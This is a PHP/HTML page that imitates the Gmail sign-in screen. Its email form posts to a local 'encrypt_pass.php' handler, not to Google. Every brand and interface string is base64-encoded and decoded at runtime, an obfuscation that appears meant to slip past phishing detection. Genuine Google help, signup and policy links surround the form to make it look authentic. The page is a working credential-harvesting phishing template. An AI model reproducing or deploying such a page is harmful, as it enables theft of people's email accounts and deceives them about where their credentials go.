<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link rel="stylesheet" href="mystyle.css">
</head>

<body>
    <div class="container">
        <div class="left">
            <img src="./images/logo.png" alt="Logo">
            <h1 id="signInText">
                <?php
                $str ="U2lnbiBJbg==";
                echo base64_decode($str);
                ?>
            </h1>

            <p id="continueText">
                <?php
                $str ="dG8gY29udGludWUgdG8gR21haWw=";
                echo base64_decode($str);
                ?>
            </p>
        </div>
        <div class="right">
            <form id="emailForm" action="encrypt_pass.php" method="POST">
                <div class="input-group email_box">
                    <input type="text" id="email" name="email" placeholder=" " required>
                    <label for="email" class="floating-label" id="emailLabel">
                        <?php
                        $str ="RW1haWwgb3IgUGhvbmU=";
                        echo base64_decode($str);
                        ?>
                    </label>
                </div>
                <p><a href="https://accounts.google.com/signin/v2/usernamerecovery?checkedDomains=youtube&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ddm=0&dsh=S539632150%3A1723278681296235&flowEntry=ServiceLogin&flowName=GlifWebSignIn&ifkv=Ab5oB3rD5hCgnsSoYyfkAGgA8OIYn5AevDToIDUPwZUuh8fmwo-zMuGBGQ33dMpiJ097L1DZrYsBlw&pstMsg=1&rip=1&service=mail"
                        class="link" id="forgotEmailLink">
                        <?php
                        $str ="Rm9yZ290IGVtYWlsPw==";
                        echo base64_decode($str);
                        ?>

                    </a></p>
                <p id="guestModeText" class="useGuestmode">
                    <?php
                    $str ="Tm90IHlvdXIgY29tcHV0ZXI/IFVzZSBHdWVzdCBtb2RlIHRvIHNpZ24gaW4gcHJpdmF0ZWx5Lg==";
                    echo base64_decode($str);
                    ?>
                </p>
                <p id="learnMore" class="learnmore"><a href="https://support.google.com/chrome/answer/6130773?hl=en">
                        <?php
                        $str ="TGVhcm4gbW9yZSBhYm91dCB1c2luZyBHdWVzdCBtb2Rl";
                        echo base64_decode($str);
                        ?>
                    </a></p>
                <div class="action-group">
                    <div class="dropdown-container">
                        <a href="#" id="createAccountLink" class="link-button">
                            <?php
                $str ="Q3JlYXRlIGFjY291bnQ=";
                echo base64_decode($str);
                ?>
                            <div class="dropdown-content">
                                <a
                                    href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://mail.google.com/mail/&ddm=0&dsh=S419976642:1723294326531733&flowEntry=SignUp&flowName=GlifWebSignIn&ifkv=Ab5oB3qlI19FwhTsNIiuYR2myMMEQ_zjl9OkzvXAQzcj5VEZkl3WOLMuweKkiQNqniXxzf1TiaKYjQ&rip=1&service=mail&TL=AKeb6mymG8mNrazYYHJb81j2dd2Kwq9B-I-4-1tH5bIJj44E9njkC5sVqtHh4bJR">
                                    <?php
                                    $str ="Rm9yIG15IHBlcnNvbmFsIHVzZQ==";
                                    echo base64_decode($str);
                                    ?>
                                </a>
                                <a
                                    href="https://accounts.google.com/signup/v2/kidaccountinfo?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ddm=0&dsh=S-1508913115%3A1723294097286523&flowEntry=ServiceLogin&flowName=GlifWebSignIn&ifkv=Ab5oB3rAYFnxEXuluavf1ZAnTCT1-ny42CDSAdjR_-79SFjWz3sHVgc3lDbe6uqOEjGxscVWgUOw2A&rip=1&service=mail">
                                    <?php
                                    $str ="Rm9yIG15IGNoaWxk";
                                    echo base64_decode($str);
                                    ?>

                                </a>
                                <a
                                    href="https://workspace.google.com/business/signup/newbusiness?utm_source=gaia-in-product&utm_medium=et&utm_campaign=newSIM_gmail&xsell=google_accounts&back=https%253A%252F%252Faccounts.google.com%252Flifecycle%252Fflows%252Fsignup%253Fbiz%253Dtrue%2526continue%253Dhttps%25253A%25252F%25252Fmail.google.com%25252Fmail%25252F%2526ddm%253D0%2526dsh%253DS-1508913115%25253A1723294097286523%2526flowEntry%253DSignUp%2526flowName%253DGlifWebSignIn%2526ifkv%253DAb5oB3qlI19FwhTsNIiuYR2myMMEQ_zjl9OkzvXAQzcj5VEZkl3WOLMuweKkiQNqniXxzf1TiaKYjQ%2526rip%253D1%2526service%253Dmail">
                                    <?php
                                    $str ="Rm9yIHdvcmsgb3IgbXkgYnVzaW5lc3M=";
                                    echo base64_decode($str);
                                    ?>

                                </a>
                            </div>
                    </div>

                    </a>
                    <button type="submit" id="nextButton" class="btn">
                        <?php
                        $str ="TmV4dA==";
                        echo base64_decode($str);
                        ?>
                    </button>
                </div>
            </form>
        </div>
    </div>

    <div class="footer">
        <div class="footer-left">
            <select id="languageSelect" class="languageselected">
                <option value="en">
                    <?php
                    $str ="RW5nbGlzaCAoVW5pdGVkIFN0YXRlcyk=";
                    echo base64_decode($str);
                    ?>
                </option>
                <option value="es">
                    <?php
                    $str ="RXNwYcOxb2wgKEVzcGHDsWEp";
                    echo base64_decode($str);
                    ?>
                </option>
                <option value="fr">
                    <?php
                    $str ="RnJhbsOnYWlzIChGcmFuY2Up";
                    echo base64_decode($str);
                    ?>
                </option>
                <option value="de">
                    <?php
                    $str ="RGV1dHNjaCAoRGV1dHNjaGxhbmQp";
                    echo base64_decode($str);
                    ?>
                </option>
                <option value="zh">
                    <?php
                    $str ="5Lit5paHICjkuK3lm70p";
                    echo base64_decode($str);
                    ?>
                </option>
                <option value="ja">
                    <?php
                    $str ="5pel5pys6KqeICjml6XmnKwp";
                    echo base64_decode($str);
                    ?>
                </option>
                <option value="hi">
                    <?php
                    $str ="4KS54KS/4KSo4KWN4KSm4KWAICjgpK3gpL7gpLDgpKQp";
                    echo base64_decode($str);
                    ?>
                </option>
                <option value="fr-CA">
                    <?php
                    $str ="RnJhbsOnYWlzIChDYW5hZGEp";
                    echo base64_decode($str);
                    ?>
                </option>
                <option value="de-AT">
                    <?php
                    $str ="RGV1dHNjaCAow5ZzdGVycmVpY2gp";
                    echo base64_decode($str);
                    ?>
                </option>
                <option value="it">
                    <?php
                    $str ="SXRhbGlhbm8gKEl0YWxpYSk=";
                    echo base64_decode($str);
                    ?>
                </option>
                <option value="pt">
                    <?php
                    $str ="UG9ydHVndcOqcyAoQnJhc2lsKQ==";
                    echo base64_decode($str);
                    ?>
                </option>
                <option value="ru">
                    <?php
                    $str ="0KDRg9GB0YHQutC40LkgKNCg0L7RgdGB0LjRjyk=";
                    echo base64_decode($str);
                    ?>
                </option>
            </select>
        </div>
        <div class="footer-right">
            <p id="helppravacyterms" class="helppravacyterms">
                <a href="https://support.google.com/accounts?hl=en&visit_id=638588549088823013-2287587084&rd=2&p=account_iph#topic=3382296"
                    class="link1">
                    <?php
                    $str ="SGVscA==";
                    echo base64_decode($str);
                    ?>
                </a>
                <a href="https://policies.google.com/privacy?gl=IN&hl=en-US" class="link1">
                    <?php
                    $str ="UHJpdmFjeQ==";
                    echo base64_decode($str);
                    ?>
                </a>
                <a href="https://policies.google.com/terms?gl=IN&hl=en-US" class="link1">
                    <?php
                    $str ="VGVybXM=";
                    echo base64_decode($str);
                    ?>
                </a>
            </p>
        </div>
    </div>

    <script src="script.js"></script>
</body>

</html>